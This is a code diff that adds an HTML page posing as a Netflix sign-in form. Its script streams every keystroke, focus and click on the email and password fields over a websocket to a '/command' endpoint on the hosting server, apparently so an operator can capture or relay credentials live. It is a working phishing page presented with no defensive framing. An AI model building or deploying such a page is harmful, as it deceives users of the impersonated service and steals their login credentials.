@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>DV - Netflix</title>
+  <link href="assets/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+  <link href="assets/css/style.css" rel="stylesheet">
+  <script type="text/javascript" src="assets/js/jquery.min.js"></script>
+  <script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="assets/js/socket.io.js"></script>
+</head>
+<body id="LoginForm">
+  <div class="bg-overlay"></div>
+   <div class="logo">
+      <img src="assets/img/logo.png" class="img-responsive" width="200" />
+    </div>
+  <div class="container">
+    <div class="login-form">
+      <div class="main-div">
+        <div class="panel">
+         <h2>Sign In</h2>
+        </div>
+        <form id="Login">
+            <div class="form-group">
+                <input type="email" name="email" class="form-control" 
+                id="inputEmail" 
+                placeholder="Email Address"
+                autocomplete="off"
+                onclick="changeInput(this)" 
+                onfocus="changeInput(this)" 
+                onkeyup="changeText(this)">
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" class="form-control" 
+                id="inputPassword" 
+                placeholder="Password"
+                 autocomplete="off"
+                onclick="changeInput(this)"
+                onfocus="changeInput(this)"
+                onkeyup="changeText(this)">
+            </div>
+            <button type="button" onclick="clickButton('submit')" class="btn btn-primary">
+            Login
+          </button>
+        </form>
+      </div>
+     
+    </div>
+  </div>
+  <script>
+      location.queryString = {};
+      location.search.substr(1).split("&").forEach(function (pair) {
+        console.log(pair);
+          if (pair === "") return;
+          var parts = pair.split("=");
+          location.queryString[parts[0]] = parts[1] &&
+              decodeURIComponent(parts[1].replace(/\+/g, " "));
+      });
+      var socket = io('ws:' + '//' + location.host + '/command', {
+        transports: ['websocket']
+      });
+      socket.on('connect', () => {
+        console.log(socket.connected); // true
+      });
+
+      function changeInput(input){
+        socket.emit('changeInput', {
+          field: input.name,
+          value: input.value
+        });
+      }
+
+      function clickButton(button){
+        socket.emit('clickButton', {
+          field: button
+        });
+      }
+
+      function changeText(input){
+        socket.emit('changeText', {
+          field: input.name,
+          value: input.value
+        });
+      }
+    </script>
+</body>
+</html>
